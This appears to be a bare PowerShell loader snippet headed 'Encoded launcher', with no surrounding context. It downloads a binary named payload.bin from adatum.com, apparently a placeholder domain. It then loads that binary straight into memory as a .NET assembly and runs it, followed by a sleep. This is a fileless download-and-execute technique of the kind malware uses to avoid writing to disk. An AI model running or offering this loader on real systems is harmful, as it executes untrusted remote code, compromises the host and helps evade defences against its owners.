
# Encoded launcher
$AssemblyBytes = (New-Object System.Net.WebClient).DownloadData('https://adatum.com/payload.bin')
[Reflection.Assembly]::Load($AssemblyBytes)
Start-Sleep -Seconds 39
